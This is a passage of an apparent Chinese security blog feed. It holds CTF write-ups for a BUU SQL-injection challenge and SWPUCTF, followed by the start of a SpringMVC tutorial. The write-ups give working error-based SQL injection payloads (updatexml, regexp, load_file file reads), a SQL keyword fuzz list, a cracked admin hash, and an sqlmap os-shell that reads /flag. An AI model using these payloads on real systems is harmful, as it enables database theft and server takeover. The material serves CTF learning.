class="line">INTO</span><br><span class="line">JOIN</span><br><span class="line">LEAVE</span><br><span class="line">LEFT</span><br><span class="line">LEVEL</span><br><span class="line">sleep</span><br><span class="line">LIKE</span><br><span class="line">NAMES</span><br><span class="line">NEXT</span><br><span class="line">NULL</span><br><span class="line">OF</span><br><span class="line">ON</span><br><span class="line">|</span><br><span class="line">infromation_schema</span><br><span class="line">user</span><br><span class="line">OR</span><br><span class="line">ORDER</span><br><span class="line">ORD</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">UPDATE</span><br><span class="line">USER</span><br><span class="line">USING</span><br><span class="line">VALUE</span><br><span class="line">VALUES</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">ADD</span><br><span class="line">AND</span><br><span class="line">prepare</span><br><span class="line">set</span><br><span class="line">update</span><br><span class="line">delete</span><br><span class="line">drop</span><br><span class="line">inset</span><br><span class="line">CAST</span><br><span class="line">COLUMN</span><br><span class="line">CONCAT</span><br><span class="line">GROUP_CONCAT</span><br><span class="line">group_concat</span><br><span class="line">CREATE</span><br><span class="line">DATABASE</span><br><span class="line">DATABASES</span><br><span class="line">alter</span><br><span class="line">DELETE</span><br><span class="line">DROP</span><br><span class="line">floor</span><br><span class="line">rand()</span><br><span class="line">information_schema.tables</span><br><span class="line">TABLE_SCHEMA</span><br><span class="line">%df</span><br><span class="line">concat_ws()</span><br><span class="line">concat</span><br><span class="line">LIMIT</span><br><span class="line">ORD</span><br><span class="line">ON</span><br><span class="line">extractvalue</span><br><span class="line">order </span><br><span class="line">CAST()</span><br><span class="line">by</span><br><span class="line">ORDER</span><br><span class="line">OUTFILE</span><br><span class="line">RENAME</span><br><span class="line">REPLACE</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">updatexml</span><br><span class="line">SHOW</span><br><span class="line">SQL</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">TRUE</span><br><span class="line">instr</span><br><span class="line">benchmark</span><br><span class="line">format</span><br><span class="line">bin</span><br><span class="line">substring</span><br><span class="line">ord</span><br><span class="line"></span><br><span class="line">UPDATE</span><br><span class="line">VALUES</span><br><span class="line">VARCHAR</span><br><span class="line">VERSION</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">/*</span><br><span class="line">`</span><br><span class="line">  </span><br><span class="line">,</span><br><span class="line">users</span><br><span class="line">%0a</span><br><span class="line">%0b</span><br><span class="line">mid</span><br><span class="line">for</span><br><span class="line">BEFORE</span><br><span class="line">REGEXP</span><br><span class="line">RLIKE</span><br><span class="line">in</span><br><span class="line">sys schemma</span><br><span class="line">SEPARATOR</span><br><span class="line">XOR</span><br><span class="line">CURSOR</span><br><span class="line">FLOOR</span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">INFILE</span><br><span class="line">count</span><br><span class="line">%0c</span><br><span class="line">from</span><br><span class="line">%0d</span><br><span class="line">%a0</span><br><span class="line">=</span><br><span class="line">@</span><br><span class="line">else</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接用别人的字典来查一下</p>
<p>大概对我们注入有影响的只有空格，select的话我们可以用大小写的方式进行绕过，于是去mysql里面尝试构造出语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select * from websites where id &#x3D;1 and(select updatexml(1,concat(&#39;~&#39;,(select(database()))),1));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;</span><br><span class="line">mysql&gt; select * from websites where id &#x3D;1 and(select updatexml(1,concat(&#39;~&#39;,(select(database()))),1));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;</span><br><span class="line">mysql&gt; select * from websites where id &#x3D;1 and(select(updatexml(1,concat(&#39;~&#39;,(select(database()))),1)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;</span><br></pre></td></tr></table></figure>

<p>得到注入语句：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">admin&quot;^(select(updatexml(1,concat(&#x27;~&#x27;,(select(database()))),1)))#</span><br><span class="line">#XPATH syntax error: &#x27;~web_sqli&#x27;</span><br></pre></td></tr></table></figure>

<p>得到数据库的名字.</p>
<p>下一步获取表名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot;^(select(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)))#</span><br></pre></td></tr></table></figure>

<p>这样的话会报错，Subquery returns more than 1 row，因为不止一个表，那我们添加group_concat函数</p>
<p>在mysql中测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));</span><br><span class="line">ERROR 1242 (21000): Subquery returns more than 1 row</span><br><span class="line">mysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));</span><br><span class="line">ERROR 2013 (HY000): Lost connection to MySQL server during query</span><br><span class="line">mysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));</span><br></pre></td></tr></table></figure>

<p>得到表名：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~article,flag,users&#x27;</span><br></pre></td></tr></table></figure>

<p>这里提前剧透一下，flag表的东西是假flag，纯粹作者搞心态的，我一直觉得这种东西很多余好吧。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from student WHERE STID&#x3D;1 and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;student&quot;)),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~STID,STNAME,STSEX,STAGE,STPHONE&#39;</span><br><span class="line">mysql&gt; select * from student WHERE STID&#x3D;1 and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;student&quot;)),0x7e));</span><br></pre></td></tr></table></figure>

<p>得到字段名：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~name,pwd,email,real_flag_1s_her&#x27;</span><br></pre></td></tr></table></figure>

<p>这里其实我们就可以发现一个不方便的地方了，报错注入的回显是有限的，所以这里后面应该是here，却没有显示出来</p>
<p>注入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot;^(select(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users))),0x7e)))#</span><br></pre></td></tr></table></figure>

<p>得到的东西很奇怪：</p>
<p>~xxxx,xxx,xxx什么的，这就很恶心人了，于是我们尝试用正则表达式来匹配我们需要的数据</p>
<p>别人的语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到前半段的flag：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">XPATH syntax error: &#39;:flag&#123;8091937b-0547-42a3-b7b3-41&#39;</span><br></pre></td></tr></table></figure>

<p>这样的话还是不够，我们应该获取全部的数据，于是继续构造：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~fuzhufuzh&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(group_concat(STNAME))from student)),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~fuzhufuzh&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select reverse((group_concat(STNAME)))from student)),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~hzufuhzuf&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));</span><br><span class="line">ERROR 2013 (HY000): Lost connection to MySQL server during query</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    11</span><br><span class="line">Current database: webos</span><br><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~hzufuhzuf&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));</span><br></pre></td></tr></table></figure>

<p>因为Markdown自动的弱智不全，导致我fuzz了巨他妈久</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">admin&quot;||(updatexml(1,concat(0x3a,(select(reverse(group_concat(real_flag_1s_here)))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#</span><br></pre></td></tr></table></figure>

<p><img src="image-20201118221117122.png" alt="image-20201118221117122"></p>
<p>得到flag：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;8091937b-0547-42a3-b7b3-415a267a6a46&#125;</span><br></pre></td></tr></table></figure>



<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>这道题的不难，就是出题人比较险恶，让你需要测试很久，过滤的东西，也很多，但是自己还是学到很多东西的，这里记录一下regexp：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">https://dev.mysql.com/doc/refman/5.7/en/regexp.html#operator_regexp</span><br></pre></td></tr></table></figure>

<p>官方允许用户查询的时候使用正则表达式来返回满足的结果，若我们对一串字符串进行查询，若查询成功，则会返回1，否则就是0</p>
<p><img src="image-20201119122114553.png" alt="image-20201119122114553"></p>
<p>除此之外，若我们查询的是一个结果集，则会返回匹配的相应数据：</p>
<p><img src="image-20201119122203777.png" alt="image-20201119122203777"></p>
<p>总结下来查询的结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select [内容] from [表名] where [限定查询目标，只能去匹配一个字段的目标] REGEXP [&#39;正则表达式&#39;];</span><br><span class="line">#例子：</span><br><span class="line">SELECT * from websites where url REGEXP &#39;goo&#39;;</span><br></pre></td></tr></table></figure>

<p>那么我们的注入语句可以编写成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#</span><br></pre></td></tr></table></figure>

<p>除此之外应该还可以利用该语句进行盲注：</p>
<p>首先构造if语句，if语句格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT IF(1&gt;2,2,3);</span><br><span class="line">        -&gt; 3</span><br><span class="line">mysql&gt; SELECT IF(1&lt;2,&#39;yes&#39;,&#39;no&#39;);</span><br><span class="line">        -&gt; &#39;yes&#39;</span><br><span class="line">mysql&gt; SELECT IF(STRCMP(&#39;test&#39;,&#39;test1&#39;),&#39;no&#39;,&#39;yes&#39;);</span><br><span class="line">        -&gt; &#39;no&#39;</span><br><span class="line">#那么格式如下：</span><br><span class="line">if([判断表达式],[成功的结果],[失败的结果]);</span><br></pre></td></tr></table></figure>

<p>注入中通常使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select * from websites where id &#x3D;&#39;1&#39; and if( (1&#x3D;1),0,1);</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from websites where id &#x3D;&#39;1&#39; and if( (1&#x3D;1),1,0);</span><br><span class="line">+----+--------+------------------------+-------+---------+</span><br><span class="line">| id | name   | url                    | alexa | country |</span><br><span class="line">+----+--------+------------------------+-------+---------+</span><br><span class="line">|  1 | Google | https:&#x2F;&#x2F;www.google.cm&#x2F; |     1 | USA     |</span><br><span class="line">+----+--------+------------------------+-------+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">#逻辑符号：</span><br><span class="line">#&amp;&amp; 为 and，^ 为xor，||为或</span><br></pre></td></tr></table></figure>

<p>拼凑出来可以得到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and 1&#x3D;(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA&#x3D;&quot;security&quot; AND table_name REGEXP &#39;^e&#39; LIMIT 0,1) </span><br></pre></td></tr></table></figure>

<p>这里顺便记录一下load_file的报错注入：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">search.php?keywords=&#x27;and extractvalue(0x7e,concat(0x7e,(mid((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">&#x27;ar/wwwml/flag.php&#x27;</span>)),<span class="number">60</span>,<span class="number">80</span>))))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>



<p>文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freesion.com&#x2F;article&#x2F;2367234678&#x2F;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>RoacCTFOnlineProxy</title>
    <url>/2020/11/26/RoacCTFOnlineProxy/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPUCTF</title>
    <url>/2020/12/06/SWPUCTF/</url>
    <content><![CDATA[<h1 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h1><p>通过扫目录能够得到Index.php.bak,得出如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">GET /important_index_its_so_long_right.php?id=1 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p>在这个url下面可以进行注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;182.150.46.187:8802&#x2F;important_index_its_so_long_right.php?id&#x3D;1</span><br></pre></td></tr></table></figure>

<p>扫出来密码：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">+----------------------------------+----------+------+</span><br><span class="line">| pwd                              | usn      | id   |</span><br><span class="line">+----------------------------------+----------+------+</span><br><span class="line">| f1097380e513e86f2c1548cc1094bf4e | admin123 | 1    |</span><br><span class="line">+----------------------------------+----------+------+</span><br></pre></td></tr></table></figure>

<p>somd5解密可以得出：wllm@123，这个可以登陆后台，h1nt我们也可以去注入出来东西</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">+------+--------------------------------------+--------+</span><br><span class="line">| id   | hint                                 | user   |</span><br><span class="line">+------+--------------------------------------+--------+</span><br><span class="line">| 1    | last_index_come_on_swpu_ctf.php?id=4 | 00001  |</span><br><span class="line">+------+--------------------------------------+--------+</span><br></pre></td></tr></table></figure>

<p>登陆后台：</p>
<p>源码中可以看见：writeuser_00001_log.log</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMToyMToxNi9pcDoxMjcuMC4wLjEvdmlldzp3aWZlLmh0bWw=</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMToyMToyMC9pcDoxMjcuMC4wLjEvdmlldzpkYXFpLmh0bWw=</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMToyMjozMy9pcDoxMjcuMC4wLjEvdmlldzpqaWF5b3UuaHRtbA==</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMToyNToxNi9pcDoxMjcuMC4wLjEvdmlldzphZG1pbmlzdHJhdG9yLmh0bWw=</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMToyOToxNi9pcDoxMjcuMC4wLjEvdmlldzpkYXFpLmh0bWw=</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMjoyMToxNi9pcDoxMjcuMC4wLjEvdmlldzptZW8ucGhw</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMzoyMToxNi9pcDoxMjcuMC4wLjEvdmlldzptZXNzLnBocA==</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyNDoyMzoxNC9pcDoxMjcuMC4wLjEvdmlldzplY3kucGhw</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyNjoyMTozMy9pcDoxMjcuMC4wLjEvdmlldzpob21lLnBocA==</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyNzoyMTo1Ni9pcDoxMjcuMC4wLjEvdmlldzppbmRleC5waHA=</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyNzoyMzoxNi9pcDoxMjcuMC4wLjEvdmlldzp1cF9sb19hZF9hZF9taW4ucGhw</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyODoyMjoyNi9pcDoxMjcuMC4wLjEvdmlldzptZXNzLnBocA==</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyODoyNToyNi9pcDoxMjcuMC4wLjEvdmlldzo0MDQuaHRtbA==</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyOToxOToxNi9pcDoxMjcuMC4wLjEvdmlldzphZG1pbi5waHA=</span><br></pre></td></tr></table></figure>

<p>全部解密出来，up_lo_ad_ad_min.php：</p>
<p>访问：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">非法文件类型</span><br><span class="line">请先去up_lo_ad_er_security.php进行登录</span><br></pre></td></tr></table></figure>

<p>用user 00001去登陆，发现一个文件上传的点，结合之前的sql注入，所以我们可以用这里写shell进去获取权限</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">45948上传文件名: 1 (2).jpg</span><br><span class="line">文件类型: image/jpeg</span><br><span class="line">文件大小: 44.87109375 kB</span><br><span class="line">文件临时存储的位置: /tmp/phpJluzIg</span><br><span class="line">文件存储在: upl_oad_pat_h/1 (2).jpg</span><br></pre></td></tr></table></figure>

<p>可以将shell上传到upl_oad_pat_h目录下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">which web application language does the web server support?</span><br><span class="line">[1] ASP</span><br><span class="line">[2] ASPX</span><br><span class="line">[3] JSP</span><br><span class="line">[4] PHP (default)</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 4</span></span><br><span class="line">[17:30:56] [WARNING] unable to automatically retrieve the web server document root</span><br><span class="line">what do you want to use for writable directory?</span><br><span class="line">[1] common location(s) (&#x27;/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs&#x27;) (default)</span><br><span class="line">[2] custom location(s)</span><br><span class="line">[3] custom directory list file</span><br><span class="line">[4] brute force search</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">os-shell&gt;</span><span class="bash"> cat /flag</span></span><br><span class="line">do you want to retrieve the command standard output? [Y/n/a] y</span><br><span class="line">command standard output: &#x27;flag&#123;d1ddddhm_swpu_e@sy_h@ck&#125;&#x27;</span><br><span class="line"><span class="meta">os-shell&gt;</span><span class="bash"> </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>SpringMVC</title>
    <url>/2020/11/19/SpringMVC/</url>
    <content><![CDATA[<p>注入了一天真的整的人都头晕眼花的，学一下开发放松一下</p>
<h1 id="SpringMVC-01"><a href="#SpringMVC-01" class="headerlink" title="SpringMVC-01"></a>SpringMVC-01</h1><p>我们首先第一步先复习Servlet和tomcat</p>
<p>我们老样子，三层架构，然后导入包什么的</p>
<p>类的组织：</p>
<p><img src="image-20201119205548729.png" alt="image-20201119205548729"></p>
<p>注意请创建MAVEN项目</p>
<p>之后是导包：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.junit.jupiter/junit-jupiter-api --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.jupiter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-jupiter-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-core --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.10.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet.jsp/javax.servlet.jsp-api --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet.jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再之后是写代码：</p>
<p>HelloServlet：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.gura.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"><span class="comment">//        获取前端参数</span></span><br><span class="line">        String method =req.getParameter(<span class="string">&quot;method&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (method.equals(<span class="string">&quot;add&quot;</span>))&#123;</span><br><span class="line">            req.getSession().setAttribute(<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;执行了添加方法&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.equals(<span class="string">&quot;delete&quot;</span>))&#123;</span><br><span class="line">            req.getSession().setAttribute(<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;执行了delte方法&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//调用业务</span></span><br><span class="line"><span class="comment">//    视图转发或者重定向</span></span><br><span class="line">        req.getRequestDispatcher(<span class="string">&quot;/WEB-INF/jsp/test.jsp&quot;</span>).forward(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        doGet(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>test.jsp:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: <span class="number">75620</span></span><br><span class="line">  Date: <span class="number">2020</span>/<span class="number">11</span>/<span class="number">19</span></span><br><span class="line">  Time: <span class="number">20</span>:<span class="number">46</span></span><br><span class="line">  To change <span class="keyword">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;$&#123;msg&#125;&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>web.xml:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.gura.servlet.HelloServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span 